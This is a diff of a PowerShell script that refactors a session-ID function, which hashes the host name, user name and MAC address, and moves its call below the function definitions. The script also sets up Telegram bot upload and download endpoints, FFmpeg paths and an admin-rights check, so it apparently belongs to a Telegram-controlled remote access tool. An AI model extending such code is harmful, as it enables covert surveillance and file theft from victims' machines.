@@ -9,7 +9,6 @@ $api_get_file               = 'https://api.telegram.org/bot{0}/getFile?file_id='
 $api_download_file          = 'https://api.telegram.org/file/bot{0}/' -f $api_token
 $api_upload_file            = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}' -f $api_token, $telegram_id
 $api_get_me                 = 'https://api.telegram.org/bot{0}/getMe' -f $api_token
-$session_id                 = Generate-UniqueSessionID
 $Global:ProgressPreference  = 'SilentlyContinue'
 
 # FFmpeg paths
@@ -21,9 +20,9 @@ function Generate-UniqueSessionID {
     $userName = $env:USERNAME
     $macAddress = Get-MacAddress
     $hashInput = "$computerName$userName$macAddress$(Get-Date -Format 'yyyyMMdd')"
-    $hash = [System.BitConverter]::ToString((New-Object System.Security.Cryptography.MD5CryptoServiceProvider).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hashInput)))
-    $hash = $hash.Replace("-", "").Substring(0, 6).ToLower()
-    return $hash
+    $hashBytes = [System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hashInput))
+    $hash = [System.BitConverter]::ToString($hashBytes) -replace "-", ""
+    return $hash.Substring(0, 6).ToLower()
 }
 
 function Get-MacAddress {
@@ -34,6 +33,9 @@ function Get-MacAddress {
         return "000000000000"
     }
 }
+
+# Now generate the session ID AFTER the functions are defined
+$session_id = Generate-UniqueSessionID
 
 function CheckAdminRights
 {
